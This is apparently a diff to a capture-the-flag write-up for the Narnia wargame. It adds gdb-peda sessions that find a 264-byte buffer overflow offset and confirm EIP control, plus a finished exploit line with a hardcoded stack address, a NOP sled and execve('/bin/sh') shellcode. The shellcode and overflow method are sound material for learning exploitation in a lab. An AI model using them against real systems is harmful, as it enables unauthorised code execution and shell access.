@@ -299,8 +299,62 @@ Invalid $PC address: 0x41414141
 Legend: code, data, rodata, value
 0x41414141 in ?? ()
 ```
+```
+gdb-peda$ pattern_create 400
+gdb-peda$ set args $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y"')
+gdb-peda$ pattern_offset 0x64254148
+1680163144 found at offset: 264
+set args $(python -c 'print "\x41" * 264 + "\x42" * 4 + "\x43" * 132')
+```
+```
+EAX: 0x0
+EBX: 0x0
+ECX: 0xffffdfc0 ("CCCCCC")
+EDX: 0xffffdd2e ("CCCCCC")
+ESI: 0x2
+EDI: 0xf7fc5000 --> 0x1b2db0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffdcb0 ('C' <repeats 132 times>)
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xffffdcb0 ('C' <repeats 132 times>)
+0004| 0xffffdcb4 ('C' <repeats 128 times>)
+0008| 0xffffdcb8 ('C' <repeats 124 times>)
+0012| 0xffffdcbc ('C' <repeats 120 times>)
+0016| 0xffffdcc0 ('C' <repeats 116 times>)
+0020| 0xffffdcc4 ('C' <repeats 112 times>)
+0024| 0xffffdcc8 ('C' <repeats 108 times>)
+0028| 0xffffdccc ('C' <repeats 104 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+```
+```
+gdb-peda$ jmpcall
+0x8048413 : call eax
+0x804844d : call edx
+0x80484a0 : call edx
+0x8049413 : call eax
+0x804944d : call edx
+0x80494a0 : call edx
+```
+```
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+```
 ### Exploit:
 ```
+set follow-fork-mode parent
+source /usr/local/peda/peda.py
+set args $(python -c 'print "\x41" * 264 + "\xd0\xdc\xff\xff" + "\x90" * 90 + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
 ```
 ### Narnia5 password: ``
 
